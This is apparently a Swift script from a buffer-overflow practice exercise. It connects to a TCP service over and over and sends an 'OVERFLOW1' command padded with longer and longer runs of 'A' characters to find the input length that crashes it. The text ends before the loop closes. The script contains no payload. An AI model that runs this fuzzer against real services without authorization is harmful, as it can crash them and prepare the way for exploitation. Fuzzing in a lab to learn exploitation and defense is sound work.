//LIBRARY INSTALLATION
//
//Add this to your Podfile:
//	pod 'SwiftSocket'
// And run then "pod install"

import Foundation

// TODO!!
// Implement commandline arguments
// and optionas flags
//

var ipAddress: String = "10.0.0.1"
var portNumber: Int = 80
var timeOutPeriod: Int = 5

var buffer = [String]()
var loopLimit: Int = 30
var counter: Int = 100

while buffer.count <= loopLimit {
	buffer.append(String(repeating: "A", count: counter))
	counter = counter + 100
} 
// Alternate array populating code using for-loop
//for index in 0..<30 {
//	buffer.append(String(repeating: "A", count: counter))
//	counter = counter + 100
//}

for bufstring in buffer {
	
	// Create a socket connection to specified IP and PORT number.
	let client = TCPClient(address: ipAddress, port: portNumber)
	
	// Calls "connect" method to actually connect to specified host.
	// Swift and Library provides a neat way of doing
	// some sort of exception handling
	switch client.connect(timeout: timeOutPeriod) //timeout period passed as argument to connect
	{
		case .success:
			print("[+] Connected Succesfully")
			// Perform a read of the returned socket.
			// No. of bytes to read as argument.
			client.read(1024) 
			print("[+] Fuzzing with", bufstring.count, "bytes")
			
			// Here we convert concatenated string to byte in preparation
			// You can specify required encoding.
			let dataTosend: Data? = "OVERFLOW1 \(bufstring)\r\n".data(using: .utf8);
			let result = client.send(data: dataTosend) // Send bytes "OverTheWire" lol
			
			// Perform another read of the socket
			// No. of bytes to read as argument.
			client.read(1024)
			
			// Then we finnally close our goddamn! socket, oops language!.
			client.close()

		case .failure(let error):
			print("[*] Could not connect to \(ipAddress) : \(portNumber)")
			exit(EXIT_FAILURE)
	}
